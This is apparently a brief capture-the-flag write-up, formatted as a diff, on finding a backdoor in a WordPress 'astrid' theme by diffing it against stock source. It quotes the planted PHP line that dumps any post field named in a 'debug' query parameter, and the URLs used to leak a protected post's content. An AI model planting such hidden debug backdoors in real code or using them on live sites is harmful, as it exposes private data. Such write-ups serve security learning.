@@ -1,0 +1,22 @@
+Download the source of wordpress & astrid
+diff them
+then get diff1.txt & diff2.txt
+
+found strange in "wp-content/themes/astrid/template-parts/content-search.php"
+
+found "<!-- debug:<?php var_dump($wp_query->post->{'post_'.(string)($_GET['debug']?:'type')}); ?>"
+
+browse https://game2.security.ntu.st/?s&debug=content
+...? no flag
+
+Ohhhhh flag is in page 2
+
+browse https://game2.security.ntu.st/page/2?s&debug=content
+
+found flag in here
+
+<div class="entry-summary">
+		<p>受保護的文章不會產生摘要。</p>
+	</div><!-- .entry-summary -->
+	<!-- debug:string(49) "FLAG{Theme is good, but it may contains backd00r}"
+ -->
